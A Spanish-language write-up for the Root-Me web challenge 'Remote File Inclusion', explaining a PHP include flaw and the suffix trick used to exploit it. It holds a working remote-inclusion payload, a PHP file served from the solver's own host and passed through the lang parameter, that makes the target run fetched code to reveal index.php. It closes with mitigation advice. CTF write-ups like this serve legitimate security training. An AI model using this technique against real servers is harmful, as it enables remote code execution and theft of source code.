# Web - Server — Remote File Inclusion

## Descripción

- **Puntos:** 30
- **Reto:** [Root-Me — Remote File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)

El parámetro de idioma compone directamente una ruta para `include` y el servidor añade el sufijo `_lang.php`. Al admitir URL remotas, la aplicación ejecuta PHP que el atacante entrega desde un recurso remoto controlado.

## Solución

1. Preparar, en infraestructura propia de pruebas, un recurso llamado `probe_lang.php` que devuelva código PHP literal; no debe ejecutarlo en el host remoto:

   ```php
   <?php echo '<?php highlight_file("index.php"); ?>'; ?>
   ```

2. Pasar la URL base sin el sufijo al parámetro `lang`:

   ```text
   ?lang=https://<host-propio>/probe
   ```

3. La aplicación compone `https://<host-propio>/probe_lang.php`, incluye la respuesta y ejecuta el código PHP devuelto en el contexto de la instancia autorizada.
4. Revisar la fuente resultante y usar el dato del reto exclusivamente en Root-Me.

## Estado de revalidación

La composición de ruta y la técnica fueron reproducidas a nivel de análisis. Falta iniciar la instancia autenticada, alojar el recurso de prueba, validar y registrar el «Like».

## Notas adicionales

- `allow_url_include` debe permanecer deshabilitado y la selección de idioma debe hacerse con una lista cerrada de archivos locales.
- No se deben incluir rutas controladas por la petición.
- La respuesta no se versiona.

## Referencias

- [Reto oficial](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)
- [PHP — include](https://www.php.net/manual/en/function.include.php)
